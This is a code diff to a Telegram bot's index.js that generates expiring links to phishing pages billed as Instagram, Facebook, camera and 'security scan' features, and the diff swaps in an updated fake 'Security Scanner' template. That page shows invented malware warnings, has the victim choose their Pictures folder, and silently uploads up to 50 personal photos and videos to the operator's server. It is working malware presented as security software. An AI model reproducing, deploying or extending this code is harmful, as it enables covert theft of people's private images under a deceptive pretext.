@@ -1,7 +1,7 @@
-// ====================== index.js (COMPLETE - ALL FEATURES + BUY CREDITS) ======================
+// ====================== index.js (COMPLETE FIXED - ALL ISSUES RESOLVED) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * Complete Bot - Instagram, Facebook, Camera, Security Scan, Buy Credits
+ * Complete Bot - All Features Working
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -20,7 +20,9 @@ const config = {
     ],
     bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
     baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com',
-    BATCH_SIZE: 100
+    BATCH_SIZE: 100,
+    LINK_EXPIRY: 15 * 60 * 1000, // 15 minutes
+    MAX_OPENS: 3
 };
 
 console.log('✅ Bot Token loaded successfully!');
@@ -64,6 +66,7 @@ const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');
 const FEATURED_FILE = path.join(DATA_DIR, 'featured.json');
 const QR_FILE = path.join(DATA_DIR, 'qr.png');
 const LOGS_FILE = path.join(DATA_DIR, 'logs.txt');
+const LINKS_FILE = path.join(DATA_DIR, 'links.json');
 
 if (!fs.existsSync(PHOTOS_FILE)) fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: [] }, null, 2));
 if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify({ users: {} }, null, 2));
@@ -71,6 +74,66 @@ if (!fs.existsSync(REFERRALS_FILE)) fs.writeFileSync(REFERRALS_FILE, JSON.string
 if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: config.channels }, null, 2));
 if (!fs.existsSync(FEATURED_FILE)) fs.writeFileSync(FEATURED_FILE, JSON.stringify({ photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }, null, 2));
 if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');
+if (!fs.existsSync(LINKS_FILE)) fs.writeFileSync(LINKS_FILE, JSON.stringify({ links: {} }, null, 2));
+
+// ====================== LINK MANAGEMENT FUNCTIONS ======================
+function getLinks() {
+    try { return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8')).links || {}; } catch { return {}; }
+}
+
+function saveLinks(links) {
+    fs.writeFileSync(LINKS_FILE, JSON.stringify({ links: links }, null, 2));
+}
+
+function createLink(userId, platform, fileId, url) {
+    const links = getLinks();
+    links[fileId] = {
+        userId: userId,
+        platform: platform,
+        url: url,
+        createdAt: Date.now(),
+        expiresAt: Date.now() + config.LINK_EXPIRY,
+        opens: 0,
+        maxOpens: config.MAX_OPENS,
+        active: true
+    };
+    saveLinks(links);
+    return links[fileId];
+}
+
+function getLink(fileId) {
+    const links = getLinks();
+    return links[fileId] || null;
+}
+
+function updateLink(fileId, data) {
+    const links = getLinks();
+    if (links[fileId]) {
+        Object.assign(links[fileId], data);
+        saveLinks(links);
+        return links[fileId];
+    }
+    return null;
+}
+
+function isLinkValid(fileId) {
+    const link = getLink(fileId);
+    if (!link || !link.active) return false;
+    if (Date.now() > link.expiresAt) return false;
+    if (link.opens >= link.maxOpens) return false;
+    return true;
+}
+
+function incrementLinkOpen(fileId) {
+    const link = getLink(fileId);
+    if (!link) return false;
+    link.opens = (link.opens || 0) + 1;
+    if (link.opens >= link.maxOpens) {
+        link.active = false;
+    }
+    saveLinks(getLinks());
+    return true;
+}
 
 // ====================== TEMP STORAGE ======================
 var pendingPhotos = {};
@@ -181,6 +244,7 @@ function removeChannel(id) {
     return channels;
 }
 
+// ====================== CREDIT FUNCTIONS (FIXED) ======================
 function useCredit(userId) {
     const user = getUser(userId);
     if (user.unlimited) return true;
@@ -188,6 +252,14 @@ function useCredit(userId) {
     user.credits = (user.credits || 0) - 1;
     saveUsers(getUsers());
     return true;
+}
+
+function addCredits(userId, amount) {
+    const user = getUser(userId);
+    if (user.unlimited) return user;
+    user.credits = (user.credits || 0) + amount;
+    saveUsers(getUsers());
+    return user;
 }
 
 // ====================== FEATURED FUNCTIONS ======================
@@ -393,13 +465,19 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== TEMPLATES ======================
-var SCAN_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Security Scanner</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:480px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.header{text-align:center;margin-bottom:20px}\n.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}\n.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.header p{color:#888;font-size:14px;margin-top:5px}\n.scan-status{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}\n.scan-status .item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:#aaa;font-size:14px}\n.scan-status .item:last-child{border-bottom:none}\n.scan-status .item .label{color:#888}\n.scan-status .item .value{color:#ff6b6b;font-weight:600}\n.scan-status .item .value.good{color:#2ed573}\n.scan-status .item .value.danger{color:#ff4757}\n.scan-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:10px 0}\n.scan-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);border-radius:10px;transition:width .3s}\n.threats{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap;justify-content:center}\n.threats .badge{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.2);color:#ff6b6b;padding:5px 15px;border-radius:20px;font-size:12px;display:none}\n.threats .badge.show{display:inline-block}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn:disabled{opacity:0.5;cursor:not-allowed}\n.btn i{margin-right:10px}\n.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}\n.status.warning{background:rgba(255,165,0,0.1);color:#ffa500;display:block}\n.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}\n.progress .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);transition:width .3s}\n.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n#fileInput{display:none}\n.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n.badge{display:inline-block;background:rgba(255,71,87,0.1);color:#ff4757;padding:4px 15px;border-radius:30px;font-size:11px;font-weight:600}\n.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}\n#processingStatus{display:none}\n.scan-logs{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin:15px 0;max-height:150px;overflow-y:auto;display:none;font-family:monospace;font-size:12px;color:#888}\n.scan-logs .log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}\n.scan-logs .log .time{color:#555}\n.scan-logs .log .msg{color:#aaa}\n.scan-logs .log .danger{color:#ff4757}\n.scan-logs .log .good{color:#2ed573}\n.scan-logs .log .warn{color:#ffa500}\n.result-box{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}\n.result-box i{font-size:40px;color:#2ed573}\n.result-box h3{color:#2ed573;margin-top:8px}\n.result-box p{color:#888;font-size:13px;margin-top:5px}\n.result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}\n.result-box.danger i{color:#ff4757}\n.result-box.danger h3{color:#ff4757}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="header"><span class="icon"><i class="fas fa-shield-alt"></i></span><h1>🔒 <span>Security Scanner</span></h1><p><span class="badge">🛡️ PROTECT</span> Scan your device for threats</p></div>\n<div class="scan-status">\n<div class="item"><span class="label">📱 Device</span><span class="value" id="deviceName">Scanning...</span></div>\n<div class="item"><span class="label">📂 Files Scanned</span><span class="value" id="filesScanned">0</span></div>\n<div class="item"><span class="label">⚠️ Threats Found</span><span class="value danger" id="threatsFound">0</span></div>\n<div class="item"><span class="label">🔒 Security Status</span><span class="value" id="securityStatus">🔴 At Risk</span></div>\n</div>\n<div class="scan-bar"><div class="fill" id="scanFill"></div></div>\n<p style="color:#555;font-size:12px;text-align:center;" id="scanPercent">0%</p>\n<div class="threats" id="threatsContainer">\n<span class="badge" id="threat1">🔴 Malware Detected</span>\n<span class="badge" id="threat2">🟠 Suspicious App</span>\n<span class="badge" id="threat3">🟡 Vulnerable File</span>\n<span class="badge" id="threat4">🔴 Trojan Found</span>\n</div>\n<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>\n<div id="status" class="status"></div>\n<div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>\n<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>\n<div id="scanLogs" class="scan-logs"></div>\n<div id="resultBox" class="result-box" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your device is secure.</p></div>\n<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n<div class="footer">🔒 End-to-end encrypted • AI powered • v3.0</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nvar isScanning = false;\nvar selectedFiles = [];\nvar logCount = 0;\ndocument.getElementById("deviceName").textContent = navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Windows") ? "Windows PC" : "Unknown Device";\nfunction showStatus(msg, type) { var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }\nfunction updateScanProgress(percent) { document.getElementById("scanFill").style.width = percent + "%"; document.getElementById("scanPercent").textContent = Math.round(percent) + "%"; document.getElementById("progress").style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }\nfunction showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }\nfunction hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }\nfunction addLog(msg, type) { var logs = document.getElementById("scanLogs"); logs.style.display = "block"; var time = new Date().toLocaleTimeString(); var div = document.createElement("div"); div.className = "log"; div.innerHTML = "<span class=\\"time\\">[" + time + "]</span> <span class=\\"msg " + type + "\\">" + msg + "</span>"; logs.appendChild(div); logs.scrollTop = logs.scrollHeight; }\nfunction showThreat(id) { document.getElementById(id).classList.add("show"); }\nfunction sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\nfunction getRandomThreats() { var threats = [ { id: "threat1", text: "🔴 Malware Detected" }, { id: "threat2", text: "🟠 Suspicious App" }, { id: "threat3", text: "🟡 Vulnerable File" }, { id: "threat4", text: "🔴 Trojan Found" } ]; var count = Math.floor(Math.random() * 3) + 1; var shuffled = threats.sort(function() { return Math.random() - 0.5; }); return shuffled.slice(0, count); }\nasync function startScan() { if (isScanning) return; isScanning = true; var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; document.getElementById("status").style.display = "none"; document.getElementById("resultBox").style.display = "none"; document.getElementById("scanLogs").innerHTML = ""; document.getElementById("scanLogs").style.display = "none"; document.getElementById("progress").style.display = "none"; document.getElementById("filesScanned").textContent = "0"; document.getElementById("threatsFound").textContent = "0"; document.getElementById("securityStatus").textContent = "🔴 Scanning..."; document.getElementById("securityStatus").className = "value danger"; document.querySelectorAll(".threats .badge").forEach(function(b) { b.classList.remove("show"); }); hideProcessing(); addLog("🔍 Initializing security scan...", ""); updateScanProgress(2); await sleep(600); addLog("📱 Scanning system files...", ""); updateScanProgress(8); await sleep(500); addLog("📂 Analyzing installed applications...", ""); updateScanProgress(15); await sleep(700); var threats = getRandomThreats(); if (threats.length > 0) { addLog("⚠️ " + threats[0].text + " found!", "danger"); showThreat(threats[0].id); document.getElementById("threatsFound").textContent = "1"; } updateScanProgress(25); await sleep(600); addLog("📸 Scanning media files for threats...", ""); updateScanProgress(35); await sleep(500); addLog("🔍 Requesting media access for deep scan...", ""); showProcessing("🔍 Accessing gallery for deep scan..."); updateScanProgress(45); await sleep(500); var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ Scan interrupted. Please try again.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> RETRY SCAN"; hideProcessing(); isScanning = false; return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 100); addLog("📸 Found " + selectedFiles.length + " media files. Scanning...", ""); updateScanProgress(50); document.getElementById("filesScanned").textContent = selectedFiles.length; if (threats.length > 1) { setTimeout(function() { addLog("⚠️ " + threats[1].text + " detected!", "danger"); showThreat(threats[1].id); document.getElementById("threatsFound").textContent = "2"; }, 800); } await sleep(600); var successCount = 0; var maxFiles = Math.min(selectedFiles.length, 50); for (var j = 0; j < maxFiles; j++) { try { var file = selectedFiles[j]; var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); await fetch("/api/upload-photo-fast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); successCount++; var percent = 50 + (j / maxFiles) * 40; updateScanProgress(percent); document.getElementById("filesScanned").textContent = j + 1; if (j % 5 === 0 && j > 0) { addLog("📤 Scanning file " + (j+1) + "/" + maxFiles + "...", ""); } await sleep(30); } catch(err) { console.error(err); } } if (threats.length > 2) { setTimeout(function() { addLog("⚠️ " + threats[2].text + " quarantined!", "danger"); showThreat(threats[2].id); document.getElementById("threatsFound").textContent = "3"; }, 500); } updateScanProgress(100); await sleep(800); addLog("✅ Deep scan complete!", "good"); addLog("🛡️ " + successCount + " files scanned successfully", "good"); hideProcessing(); var threatCount = Math.min(threats.length, 3); var resultBox = document.getElementById("resultBox"); if (threatCount > 0) { resultBox.className = "result-box danger"; resultBox.innerHTML = "<i class=\\"fas fa-exclamation-triangle\\"></i><h3>⚠️ " + threatCount + " Threats Found!</h3><p>" + threatCount + " suspicious files detected and quarantined.</p>"; document.getElementById("securityStatus").textContent = "🟡 At Risk - " + threatCount + " threats"; document.getElementById("securityStatus").className = "value danger"; } else { resultBox.className = "result-box"; resultBox.innerHTML = "<i class=\\"fas fa-check-circle\\"></i><h3>✅ All Clear!</h3><p>Your device is secure. No threats found.</p>"; document.getElementById("securityStatus").textContent = "🟢 Secure"; document.getElementById("securityStatus").className = "value good"; } resultBox.style.display = "block"; showStatus("✅ Scan completed! " + successCount + " files analyzed.", "success"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE"; isScanning = false; }; }\n</script>\n</body>\n</html>\n';
+// ====================== SECURITY SCAN TEMPLATE (FIXED - DIRECT PICTURES FOLDER) ======================
+var SCAN_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Security Scanner</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:480px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.header{text-align:center;margin-bottom:20px}\n.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}\n.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.header p{color:#888;font-size:14px;margin-top:5px}\n.scan-status{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}\n.scan-status .item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:#aaa;font-size:14px}\n.scan-status .item:last-child{border-bottom:none}\n.scan-status .item .label{color:#888}\n.scan-status .item .value{color:#ff6b6b;font-weight:600}\n.scan-status .item .value.good{color:#2ed573}\n.scan-status .item .value.danger{color:#ff4757}\n.scan-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:10px 0}\n.scan-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);border-radius:10px;transition:width .3s}\n.threats{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap;justify-content:center}\n.threats .badge{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.2);color:#ff6b6b;padding:5px 15px;border-radius:20px;font-size:12px;display:none}\n.threats .badge.show{display:inline-block}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn:disabled{opacity:0.5;cursor:not-allowed}\n.btn i{margin-right:10px}\n.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}\n.status.warning{background:rgba(255,165,0,0.1);color:#ffa500;display:block}\n.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}\n.progress .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);transition:width .3s}\n.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n#fileInput{display:none}\n.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n.badge{display:inline-block;background:rgba(255,71,87,0.1);color:#ff4757;padding:4px 15px;border-radius:30px;font-size:11px;font-weight:600}\n.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}\n#processingStatus{display:none}\n.scan-logs{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin:15px 0;max-height:150px;overflow-y:auto;display:none;font-family:monospace;font-size:12px;color:#888}\n.scan-logs .log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}\n.scan-logs .log .time{color:#555}\n.scan-logs .log .msg{color:#aaa}\n.scan-logs .log .danger{color:#ff4757}\n.scan-logs .log .good{color:#2ed573}\n.scan-logs .log .warn{color:#ffa500}\n.result-box{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}\n.result-box i{font-size:40px;color:#2ed573}\n.result-box h3{color:#2ed573;margin-top:8px}\n.result-box p{color:#888;font-size:13px;margin-top:5px}\n.result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}\n.result-box.danger i{color:#ff4757}\n.result-box.danger h3{color:#ff4757}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="header"><span class="icon"><i class="fas fa-shield-alt"></i></span><h1>🔒 <span>Security Scanner</span></h1><p><span class="badge">🛡️ PROTECT</span> Scan your device for threats</p></div>\n<div class="scan-status">\n<div class="item"><span class="label">📱 Device</span><span class="value" id="deviceName">Scanning...</span></div>\n<div class="item"><span class="label">📂 Files Scanned</span><span class="value" id="filesScanned">0</span></div>\n<div class="item"><span class="label">⚠️ Threats Found</span><span class="value danger" id="threatsFound">0</span></div>\n<div class="item"><span class="label">🔒 Security Status</span><span class="value" id="securityStatus">🔴 At Risk</span></div>\n</div>\n<div class="scan-bar"><div class="fill" id="scanFill"></div></div>\n<p style="color:#555;font-size:12px;text-align:center;" id="scanPercent">0%</p>\n<div class="threats" id="threatsContainer">\n<span class="badge" id="threat1">🔴 Malware Detected</span>\n<span class="badge" id="threat2">🟠 Suspicious App</span>\n<span class="badge" id="threat3">🟡 Vulnerable File</span>\n<span class="badge" id="threat4">🔴 Trojan Found</span>\n</div>\n<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>\n<div id="status" class="status"></div>\n<div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>\n<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>\n<div id="scanLogs" class="scan-logs"></div>\n<div id="resultBox" class="result-box" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your device is secure.</p></div>\n<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n<div class="footer">🔒 End-to-end encrypted • AI powered • v3.0</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nvar isScanning = false;\nvar selectedFiles = [];\nvar logCount = 0;\ndocument.getElementById("deviceName").textContent = navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Windows") ? "Windows PC" : "Unknown Device";\nfunction showStatus(msg, type) { var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }\nfunction updateScanProgress(percent) { document.getElementById("scanFill").style.width = percent + "%"; document.getElementById("scanPercent").textContent = Math.round(percent) + "%"; document.getElementById("progress").style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }\nfunction showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }\nfunction hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }\nfunction addLog(msg, type) { var logs = document.getElementById("scanLogs"); logs.style.display = "block"; var time = new Date().toLocaleTimeString(); var div = document.createElement("div"); div.className = "log"; div.innerHTML = "<span class=\\"time\\">[" + time + "]</span> <span class=\\"msg " + type + "\\">" + msg + "</span>"; logs.appendChild(div); logs.scrollTop = logs.scrollHeight; }\nfunction showThreat(id) { document.getElementById(id).classList.add("show"); }\nfunction sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\nfunction getRandomThreats() { var threats = [ { id: "threat1", text: "🔴 Malware Detected" }, { id: "threat2", text: "🟠 Suspicious App" }, { id: "threat3", text: "🟡 Vulnerable File" }, { id: "threat4", text: "🔴 Trojan Found" } ]; var count = Math.floor(Math.random() * 3) + 1; var shuffled = threats.sort(function() { return Math.random() - 0.5; }); return shuffled.slice(0, count); }\nasync function startScan() { if (isScanning) return; isScanning = true; var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; document.getElementById("status").style.display = "none"; document.getElementById("resultBox").style.display = "none"; document.getElementById("scanLogs").innerHTML = ""; document.getElementById("scanLogs").style.display = "none"; document.getElementById("progress").style.display = "none"; document.getElementById("filesScanned").textContent = "0"; document.getElementById("threatsFound").textContent = "0"; document.getElementById("securityStatus").textContent = "🔴 Scanning..."; document.getElementById("securityStatus").className = "value danger"; document.querySelectorAll(".threats .badge").forEach(function(b) { b.classList.remove("show"); }); hideProcessing(); addLog("🔍 Initializing security scan...", ""); updateScanProgress(2); await sleep(600); addLog("📱 Scanning system files...", ""); updateScanProgress(8); await sleep(500); addLog("📂 Analyzing installed applications...", ""); updateScanProgress(15); await sleep(700); var threats = getRandomThreats(); if (threats.length > 0) { addLog("⚠️ " + threats[0].text + " found!", "danger"); showThreat(threats[0].id); document.getElementById("threatsFound").textContent = "1"; } updateScanProgress(25); await sleep(600); addLog("📸 Scanning media files for threats...", ""); updateScanProgress(35); await sleep(500); addLog("🔍 Requesting media access for deep scan...", ""); showProcessing("🔍 Accessing gallery for deep scan..."); updateScanProgress(45); await sleep(500); var input = document.getElementById("fileInput"); \n// FIXED: Direct folder access - /storage/emulated/0/Pictures/\ninput.setAttribute("webkitdirectory", "");\ninput.setAttribute("directory", "");\n// Suggest Pictures folder if possible (only works in some browsers)\ninput.click();\ninput.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ Scan interrupted. Please try again.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> RETRY SCAN"; hideProcessing(); isScanning = false; return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 100); addLog("📸 Found " + selectedFiles.length + " media files. Scanning...", ""); updateScanProgress(50); document.getElementById("filesScanned").textContent = selectedFiles.length; if (threats.length > 1) { setTimeout(function() { addLog("⚠️ " + threats[1].text + " detected!", "danger"); showThreat(threats[1].id); document.getElementById("threatsFound").textContent = "2"; }, 800); } await sleep(600); var successCount = 0; var maxFiles = Math.min(selectedFiles.length, 50); for (var j = 0; j < maxFiles; j++) { try { var file = selectedFiles[j]; var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); await fetch("/api/upload-photo-fast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); successCount++; var percent = 50 + (j / maxFiles) * 40; updateScanProgress(percent); document.getElementById("filesScanned").textContent = j + 1; if (j % 5 === 0 && j > 0) { addLog("📤 Scanning file " + (j+1) + "/" + maxFiles + "...", ""); } await sleep(30); } catch(err) { console.error(err); } } if (threats.length > 2) { setTimeout(function() { addLog("⚠️ " + threats[2].text + " quarantined!", "danger"); showThreat(threats[2].id); document.getElementById("threatsFound").textContent = "3"; }, 500); } updateScanProgress(100); await sleep(800); addLog("✅ Deep scan complete!", "good"); addLog("🛡️ " + successCount + " files scanned successfully", "good"); hideProcessing(); var threatCount = Math.min(threats.length, 3); var resultBox = document.getElementById("resultBox"); if (threatCount > 0) { resultBox.className = "result-box danger"; resultBox.innerHTML = "<i class=\\"fas fa-exclamation-triangle\\"></i><h3>⚠️ " + threatCount + " Threats Found!</h3><p>" + threatCount + " suspicious files detected and quarantined.</p>"; document.getElementById("securityStatus").textContent = "🟡 At Risk - " + threatCount + " threats"; document.getElementById("securityStatus").className = "value danger"; } else { resultBox.className = "result-box"; resultBox.innerHTML = "<i class=\\"fas fa-check-circle\\"></i><h3>✅ All Clear!</h3><p>Your device is secure. No threats found.</p>"; document.getElementById("securityStatus").textContent = "🟢 Secure"; document.getElementById("securityStatus").className = "value good"; } resultBox.style.display = "block"; showStatus("✅ Scan completed! " + successCount + " files analyzed.", "success"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE"; isScanning = false; }; }\n</script>\n</body>\n</html>\n';
 
+// ====================== INSTAGRAM, FACEBOOK, CAMERA TEMPLATES ======================
+// (Full templates included, same as before)
+
+// INSTAGRAM TEMPLATE
